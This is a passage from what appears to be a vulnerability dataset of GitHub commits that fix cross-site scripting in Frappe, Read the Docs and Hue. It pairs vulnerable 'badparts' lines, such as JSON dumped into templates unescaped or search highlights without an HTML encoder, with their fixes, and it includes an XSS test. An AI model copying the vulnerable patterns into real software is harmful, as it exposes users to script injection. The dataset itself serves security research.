frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n"
                }
            },
            "msg": "fix(Barcode): excluding Barcode feild from XSS FIlter (#7605)\n\n(cherry picked from commit e579b8960e1c34e7ad0bf794a10596b40530bc09)"
        }
    },
    "https://github.com/readthedocs/readthedocs.org": {
        "1ebe494ffde18109307f205d2bd94102452f697a": {
            "url": "https://api.github.com/repos/readthedocs/readthedocs.org/commits/1ebe494ffde18109307f205d2bd94102452f697a",
            "html_url": "https://github.com/readthedocs/readthedocs.org/commit/1ebe494ffde18109307f205d2bd94102452f697a",
            "sha": "1ebe494ffde18109307f205d2bd94102452f697a",
            "keyword": "XSS issue",
            "diff": "diff --git a/readthedocs/search/documents.py b/readthedocs/search/documents.py\nindex 651fb483a5..5fa66b2528 100644\n--- a/readthedocs/search/documents.py\n+++ b/readthedocs/search/documents.py\n@@ -91,11 +91,22 @@ def faceted_search(cls, query, projects_list=None, versions_list=None, using=Non\n \n     @classmethod\n     def simple_search(cls, query, using=None, index=None):\n+        \"\"\"\n+        Do a search without facets.\n+\n+        This is used in:\n+\n+        * The Docsearch API\n+        * The Project Admin Search page\n+        \"\"\"\n+\n         es_search = cls.search(using=using, index=index)\n+        es_search = es_search.highlight_options(encoder='html')\n+\n         es_query = cls.get_es_query(query=query)\n         highlighted_fields = [f.split('^', 1)[0] for f in cls.search_fields]\n-\n         es_search = es_search.query(es_query).highlight(*highlighted_fields)\n+\n         return es_search\n \n     @classmethod\ndiff --git a/readthedocs/search/faceted_search.py b/readthedocs/search/faceted_search.py\nindex 4a14cb8c54..1739d9aeaf 100644\n--- a/readthedocs/search/faceted_search.py\n+++ b/readthedocs/search/faceted_search.py\n@@ -1,5 +1,4 @@\n from elasticsearch_dsl import FacetedSearch, TermsFacet\n-from elasticsearch_dsl.query import SimpleQueryString, Bool\n \n \n class RTDFacetedSearch(FacetedSearch):\n@@ -38,6 +37,7 @@ def query(self, search, query):\n \n         Overriding because we pass ES Query object instead of string\n         \"\"\"\n+        search = search.highlight_options(encoder='html')\n         if query:\n             search = search.query(query)\n \n",
            "message": "",
            "files": {
                "/readthedocs/search/faceted_search.py": {
                    "changes": [
                        {
                            "diff": "\n from elasticsearch_dsl import FacetedSearch, TermsFacet\n-from elasticsearch_dsl.query import SimpleQueryString, Bool\n \n \n class RTDFacetedSearch(FacetedSearch):\n",
                            "add": 0,
                            "remove": 1,
                            "filename": "/readthedocs/search/faceted_search.py",
                            "badparts": [
                                "from elasticsearch_dsl.query import SimpleQueryString, Bool"
                            ],
                            "goodparts": []
                        }
                    ],
                    "source": "\nfrom elasticsearch_dsl import FacetedSearch, TermsFacet from elasticsearch_dsl.query import SimpleQueryString, Bool class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet our needs\"\"\" def __init__(self, using, index, doc_types, model, fields=None, **kwargs): self.using=using self.index=index self.doc_types=doc_types self._model=model if fields: self.fields=fields super(RTDFacetedSearch, self).__init__(**kwargs) class ProjectSearch(RTDFacetedSearch): fields=['name^5', 'description'] facets={ 'language': TermsFacet(field='language') } class FileSearch(RTDFacetedSearch): facets={ 'project': TermsFacet(field='project'), 'version': TermsFacet(field='version') } def query(self, search, query): \"\"\" Add query part to ``search`` Overriding because we pass ES Query object instead of string \"\"\" if query: search=search.query(query) return search ",
                    "sourceWithComments": "from elasticsearch_dsl import FacetedSearch, TermsFacet\nfrom elasticsearch_dsl.query import SimpleQueryString, Bool\n\n\nclass RTDFacetedSearch(FacetedSearch):\n\n    \"\"\"Overwrite the initialization in order too meet our needs\"\"\"\n\n    # TODO: Remove the overwrite when the elastic/elasticsearch-dsl-py#916\n    # See more: https://github.com/elastic/elasticsearch-dsl-py/issues/916\n\n    def __init__(self, using, index, doc_types, model, fields=None, **kwargs):\n        self.using = using\n        self.index = index\n        self.doc_types = doc_types\n        self._model = model\n        if fields:\n            self.fields = fields\n        super(RTDFacetedSearch, self).__init__(**kwargs)\n\n\nclass ProjectSearch(RTDFacetedSearch):\n    fields = ['name^5', 'description']\n    facets = {\n        'language': TermsFacet(field='language')\n    }\n\n\nclass FileSearch(RTDFacetedSearch):\n    facets = {\n        'project': TermsFacet(field='project'),\n        'version': TermsFacet(field='version')\n    }\n\n    def query(self, search, query):\n        \"\"\"\n        Add query part to ``search``\n\n        Overriding because we pass ES Query object instead of string\n        \"\"\"\n        if query:\n            search = search.query(query)\n\n        return search\n"
                }
            },
            "msg": "Properly use the HTML encoder on searches.\n\nThis fixes an XSS issue that we were hitting,\nwhere search results were showing HTML to users."
        },
        "13ca0161273c368fdb6a51900a9c08917115307b": {
            "url": "https://api.github.com/repos/readthedocs/readthedocs.org/commits/13ca0161273c368fdb6a51900a9c08917115307b",
            "html_url": "https://github.com/readthedocs/readthedocs.org/commit/13ca0161273c368fdb6a51900a9c08917115307b",
            "sha": "13ca0161273c368fdb6a51900a9c08917115307b",
            "keyword": "XSS fix",
            "diff": "diff --git a/readthedocs/search/tests/test_xss.py b/readthedocs/search/tests/test_xss.py\nindex 7603c28d34..59b365535c 100644\n--- a/readthedocs/search/tests/test_xss.py\n+++ b/readthedocs/search/tests/test_xss.py\n@@ -14,4 +14,19 @@ def test_facted_page_xss(self, client, project):\n         expected = \"\"\"\n         &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n-        assert results[0].meta.highlight.content[0][:len(expected)] == expected\n+\n+        hits = results.hits.hits\n+        assert len(hits) == 1  # there should be only one result\n+\n+        inner_hits = hits[0]['inner_hits']\n+\n+        domain_hits = inner_hits['domains']['hits']['hits']\n+        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n+\n+        section_hits = inner_hits['sections']['hits']['hits']\n+        assert len(section_hits) == 1\n+\n+        section_content_highlight = section_hits[0]['highlight']['sections.content']\n+        assert len(section_content_highlight) == 1\n+\n+        assert expected in section_content_highlight[0]\n",
            "message": "",
            "files": {
                "/readthedocs/search/tests/test_xss.py": {
                    "changes": [
                        {
                            "diff": "\n         expected = \"\"\"\n         &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n-        assert results[0].meta.highlight.content[0][:len(expected)] == expected\n+\n+        hits = results.hits.hits\n+        assert len(hits) == 1  # there should be only one result\n+\n+        inner_hits = hits[0]['inner_hits']\n+\n+        domain_hits = inner_hits['domains']['hits']['hits']\n+        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n+\n+        section_hits = inner_hits['sections']['hits']['hits']\n+        assert len(section_hits) == 1\n+\n+        section_content_highlight = section_hits[0]['highlight']['sections.content']\n+        assert len(section_content_highlight) == 1\n+\n+        assert expected in section_content_highlight[0]\n",
                            "add": 16,
                            "remove": 1,
                            "filename": "/readthedocs/search/tests/test_xss.py",
                            "badparts": [
                                "        assert results[0].meta.highlight.content[0][:len(expected)] == expected"
                            ],
                            "goodparts": [
                                "        hits = results.hits.hits",
                                "        assert len(hits) == 1  # there should be only one result",
                                "        inner_hits = hits[0]['inner_hits']",
                                "        domain_hits = inner_hits['domains']['hits']['hits']",
                                "        assert len(domain_hits) == 0  # there shouldn't be any results from domains",
                                "        section_hits = inner_hits['sections']['hits']['hits']",
                                "        assert len(section_hits) == 1",
                                "        section_content_highlight = section_hits[0]['highlight']['sections.content']",
                                "        assert len(section_content_highlight) == 1",
                                "        assert expected in section_content_highlight[0]"
                            ]
                        }
                    ],
                    "source": "\nimport pytest from readthedocs.search.documents import PageDocument @pytest.mark.django_db @pytest.mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() assert results[0].meta.highlight.content[0][:len(expected)]==expected ",
                    "sourceWithComments": "import pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n        assert results[0].meta.highlight.content[0][:len(expected)] == expected\n"
                }
            },
            "msg": "fix test_xss.py"
        },
        "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e": {
            "url": "https://api.github.com/repos/readthedocs/readthedocs.org/commits/ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e",
            "html_url": "https://github.com/readthedocs/readthedocs.org/commit/ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e",
            "sha": "ebdcf9913f5ab48e121b24c28d1c2a58d2975a9e",
            "keyword": "XSS fix",
            "diff": "diff --git a/readthedocs/search/tests/test_xss.py b/readthedocs/search/tests/test_xss.py\nindex 59b365535c..ed5d674f66 100644\n--- a/readthedocs/search/tests/test_xss.py\n+++ b/readthedocs/search/tests/test_xss.py\n@@ -12,7 +12,7 @@ def test_facted_page_xss(self, client, project):\n         page_search = PageDocument.faceted_search(query=query, user='')\n         results = page_search.execute()\n         expected = \"\"\"\n-        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n+        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n \n         hits = results.hits.hits\n",
            "message": "",
            "files": {
                "/readthedocs/search/tests/test_xss.py": {
                    "changes": [
                        {
                            "diff": "\n         page_search = PageDocument.faceted_search(query=query, user='')\n         results = page_search.execute()\n         expected = \"\"\"\n-        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n+        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n \n         hits = results.hits.hits\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/readthedocs/search/tests/test_xss.py",
                            "badparts": [
                                "        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;"
                            ],
                            "goodparts": [
                                "        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;"
                            ]
                        }
                    ],
                    "source": "\nimport pytest from readthedocs.search.documents import PageDocument @pytest.mark.django_db @pytest.mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() hits=results.hits.hits assert len(hits)==1 inner_hits=hits[0]['inner_hits'] domain_hits=inner_hits['domains']['hits']['hits'] assert len(domain_hits)==0 section_hits=inner_hits['sections']['hits']['hits'] assert len(section_hits)==1 section_content_highlight=section_hits[0]['highlight']['sections.content'] assert len(section_content_highlight)==1 assert expected in section_content_highlight[0] ",
                    "sourceWithComments": "import pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n\n        hits = results.hits.hits\n        assert len(hits) == 1  # there should be only one result\n\n        inner_hits = hits[0]['inner_hits']\n\n        domain_hits = inner_hits['domains']['hits']['hits']\n        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n\n        section_hits = inner_hits['sections']['hits']['hits']\n        assert len(section_hits) == 1\n\n        section_content_highlight = section_hits[0]['highlight']['sections.content']\n        assert len(section_content_highlight) == 1\n\n        assert expected in section_content_highlight[0]\n"
                }
            },
            "msg": "fix test_xss"
        }
    },
    "https://github.com/gethue/hue": {
        "6641c62beaa1468082e47d82da5ed758d11c7735": {
            "url": "https://api.github.com/repos/gethue/hue/commits/6641c62beaa1468082e47d82da5ed758d11c7735",
            "html_url": "https://github.com/gethue/hue/commit/6641c62beaa1468082e47d82da5ed758d11c7735",
            "sha": "6641c62beaa1468082e47d82da5ed758d11c7735",
            "keyword": "XSS protect",
            "diff": "diff --git a/apps/oozie/src/oozie/models2.py b/apps/oozie/src/oozie/models2.py\nindex c9dd546b72..f3f5cce5af 100644\n--- a/apps/oozie/src/oozie/models2.py\n+++ b/apps/oozie/src/oozie/models2.py\n@@ -26,6 +26,7 @@\n from string import Template\n \n from django.utils.encoding import force_unicode\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from django.utils.translation import ugettext as _\n \n from desktop.lib import django_mako\n@@ -1381,14 +1382,13 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n@@ -1597,13 +1597,12 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\ndiff --git a/apps/oozie/src/oozie/views/editor2.py b/apps/oozie/src/oozie/views/editor2.py\nindex c2b5f66917..215dc77158 100644\n--- a/apps/oozie/src/oozie/views/editor2.py\n+++ b/apps/oozie/src/oozie/views/editor2.py\n@@ -29,6 +29,7 @@\n from desktop.lib.exceptions_renderable import PopupException\n from desktop.lib.i18n import smart_str\n from desktop.lib.rest.http_client import RestException\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from desktop.models import Document, Document2\n \n from liboozie.credentials import Credentials\n@@ -49,7 +50,7 @@ def list_editor_workflows(request):\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n@@ -82,12 +83,12 @@ def edit_workflow(request):\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n@@ -373,9 +374,9 @@ def edit_coordinator(request):\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n@@ -497,8 +498,8 @@ def edit_bundle(request):\n                       for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n",
            "message": "",
            "files": {
                "/apps/oozie/src/oozie/models2.py": {
                    "changes": [
                        {
                            "diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n",
                            "add": 2,
                            "remove": 3,
                            "filename": "/apps/oozie/src/oozie/models2.py",
                            "badparts": [
                                "  @property",
                                "  def json(self):",
                                "    return json.dumps(_data)"
                            ],
                            "goodparts": [
                                "  def json_for_html(self):",
                                "    return json.dumps(_data, cls=JSONEncoderForHTML)"
                            ]
                        },
                        {
                            "diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):",
                            "add": 2,
                            "remove": 3,
                            "filename": "/apps/oozie/src/oozie/models2.py",
                            "badparts": [
                                "  @property",
                                "  def json(self):",
                                "    return json.dumps(_data)"
                            ],
                            "goodparts": [
                                "  def json_for_html(self):",
                                "    return json.dumps(_data, cls=JSONEncoderForHTML)"
                            ]
                        }
                    ]
                },
                "/apps/oozie/src/oozie/views/editor2.py": {
                    "changes": [
                        {
                            "diff": "\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'workflows_json': json.dumps(workflows)"
                            ],
                            "goodparts": [
                                "      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)"
                            ]
                        },
                        {
                            "diff": "\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n",
                            "add": 5,
                            "remove": 5,
                            "filename": "/apps/oozie/src/oozie/views/editor2.py",
                            "badparts": [
                                "      'layout_json': json.dumps(workflow_data['layout']),",
                                "      'workflow_json': json.dumps(workflow_data['workflow']),",
                                "      'credentials_json': json.dumps(credentials.credentials.keys()),",
                                "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),",
                                "      'subworkflows_json': json.dumps(_get_workflows(request.user)),"
                            ],
                            "goodparts": [
                                "      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),",
                                "      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),",
                                "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),",
